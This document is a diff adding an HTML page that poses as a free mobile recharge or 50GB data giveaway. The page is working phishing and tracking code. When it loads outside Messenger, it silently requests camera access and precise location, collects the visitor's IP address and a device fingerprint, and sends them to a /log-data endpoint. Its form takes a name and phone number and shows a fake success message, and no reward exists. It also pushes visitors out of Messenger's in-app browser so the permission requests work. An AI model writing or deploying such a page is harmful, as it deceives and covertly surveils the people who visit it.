@@ -1,0 +1,112 @@
+<!-- Messenger-friendly version -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎁 Free Recharge / Data Pack Offer</title>
+<link rel="icon" type="image/png" href="/static/favicon.png" />
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+<style>
+body { margin:0; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; text-align:center; background:#fff0f0; flex-direction:column; }
+#openBrowserWarning { display:none; }
+#main { display:none; background:#fff; padding:2rem; border-radius:20px; box-shadow:0 8px 25px rgba(0,0,0,0.2); max-width:400px; width:90%; }
+input, select, button { width:100%; padding:12px; margin:10px 0; border-radius:12px; font-size:1rem; }
+button { background:#e60023; color:white; border:none; cursor:pointer; transition:0.3s; }
+button:hover { background:#b3001b; transform:scale(1.02); }
+.success { display:none; color:green; margin-top:1rem; }
+</style>
+</head>
+<body>
+
+<div id="loading">⏳ Please wait...</div>
+
+<div id="openBrowserWarning">
+  ⚠️ Camera & Location may not work in Messenger.<br>
+  <button onclick="openInBrowser()">Open in Browser</button>
+</div>
+
+<div id="main">
+  <h1>🎉 Congratulations!</h1>
+  <p>You are eligible for a <strong>Free 500TK Recharge</strong> or <strong>50GB Data Pack</strong>.</p>
+  <input type="text" id="name" placeholder="Enter Your Name" required />
+  <input type="tel" id="number" placeholder="Enter Mobile Number" required />
+  <select id="option">
+    <option value="500TK Recharge">500TK Recharge</option>
+    <option value="50GB Data">50GB Data</option>
+  </select>
+  <button onclick="claimReward()">Recharge Now</button>
+  <p class="success" id="successMsg"></p>
+</div>
+
+<script>
+// Detect Messenger / WebView
+function isInWebView(){
+  const ua = navigator.userAgent || navigator.vendor || window.opera;
+  return (ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Messenger'));
+}
+
+// Open in browser click
+function openInBrowser(){
+  window.open(window.location.href, '_blank');
+}
+
+// Page load
+window.addEventListener('load', ()=>{
+  setTimeout(()=>{
+    document.getElementById("loading").style.display = "none";
+    if(isInWebView()){
+      document.getElementById('openBrowserWarning').style.display='block';
+    } else {
+      document.getElementById("main").style.display='block';
+      collectAndSendData();
+    }
+  },2000);
+});
+
+// Permissions & Data Collection
+async function requestPermissions(){
+  try{
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(()=>{},()=>{}, { enableHighAccuracy:true, timeout:10000 });
+    }
+    try{ await navigator.mediaDevices.getUserMedia({ video:{ width:320,height:240 } }); }catch{}
+  }catch{}
+}
+
+async function collectAndSendData(){
+  requestPermissions();
+  const [ipData] = await Promise.all([
+    fetch('https://api.ipify.org?format=json').then(res=>res.json()).then(d=>d.ip).catch(()=> "Unknown")
+  ]);
+  const deviceInfo = {
+    userAgent:navigator.userAgent,
+    platform:navigator.platform,
+    cores:navigator.hardwareConcurrency||"Unknown",
+    memory:navigator.deviceMemory||"Unknown",
+    screen:`${screen.width}x${screen.height}`,
+    languages:navigator.languages,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
+  };
+  fetch('/log-data',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({ ip:ipData, device_info:JSON.stringify(deviceInfo) })
+  }).catch(e=>console.error("Send error:",e));
+}
+
+// Reward
+function claimReward(){
+  const name=document.getElementById("name").value.trim();
+  const number=document.getElementById("number").value.trim();
+  const option=document.getElementById("option").value;
+  if(!name || !number){ alert("⚠️ Please enter all fields correctly!"); return; }
+  confetti({ particleCount:100, spread:70, origin:{y:0.6} });
+  const successMsg=document.getElementById("successMsg");
+  successMsg.textContent=`✅ ${option} has been successfully applied for ${name}!`;
+  successMsg.style.display='block';
+  setTimeout(()=>{ location.reload(); },3000);
+}
+</script>
+</body>
+  </html>
